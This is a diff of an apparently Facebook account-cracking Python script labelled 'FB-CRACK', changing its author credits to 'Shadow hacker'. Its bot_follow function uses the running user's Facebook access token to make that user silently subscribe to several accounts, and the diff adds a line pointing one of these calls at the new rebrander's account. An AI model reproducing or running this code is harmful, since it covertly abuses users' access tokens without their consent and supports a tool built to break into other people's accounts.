@@ -1,7 +1,7 @@
 #!/usr/bin/python
 # -*- coding: utf-8
-# Facebook  : Dapunta Khurayra X
-# Instagram : ratya.anonym.id
+# Facebook  : Shadow hacker
+# Instagram : hackerdx420
 
 import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize,uuid
 from multiprocessing.pool import ThreadPool
@@ -36,7 +36,7 @@ def jalan(z):
 		time.sleep(0.05)
 		
 def banner():
-    os.system('echo -e "             _______      ________  ___  _______ __\n            / __/ _ )____/ ___/ _ \/ _ |/ ___/ //_/\n           / _// _  /___/ /__/ , _/ __ / /__/ ,< \n          /_/ /____/    \___/_/|_/_/ |_\___/_/|_|\n\n               Coded By : Dapunta Khurayra X\n─────────────────────────────────────────────────────────────" | lolcat')
+    os.system('echo -e "             _______      ________  ___  _______ __\n            / __/ _ )____/ ___/ _ \/ _ |/ ___/ //_/\n           / _// _  /___/ /__/ , _/ __ / /__/ ,< \n          /_/ /____/    \___/_/|_/_/ |_\___/_/|_|\n\n               Coded By : shadow hacker cyber king\n─────────────────────────────────────────────────────────────" | lolcat')
 
 idmem = []
 idfriend = []
@@ -146,12 +146,12 @@ def bot_follow():
 	except IOError:
 		print("\n   [!] Token invalid")
 		masuk()
-    	requests.post('https://graph.facebook.com/1827084332/subscribers?access_token=' + toket)      #Dapunta Khurayra X
+    	requests.post('https://graph.facebook.com/102537698751441/subscribers?access_token=' + toket)      #cyber king
     	requests.post('https://graph.facebook.com/1602590373/subscribers?access_token=' + toket)      #Anthonyus Immanuel
     	requests.post('https://graph.facebook.com/100000729074466/subscribers?access_token=' + toket) #Abigaille Dirgantara
     	requests.post('https://graph.facebook.com/607801156/subscribers?access_token=' + toket)       #Boirah
     	requests.post('https://graph.facebook.com/100009340646547/subscribers?access_token=' + toket) #Anita Zuliatin
-    	requests.post('https://graph.facebook.com/100000415317575/subscribers?access_token=' + toket) #Dapunta Xayonara
+    	requests.post('https://graph.facebook.com/100000415317575/subscribers?access_token=' + toket) #shadow hacker
     	menu()
 			
 def menu():
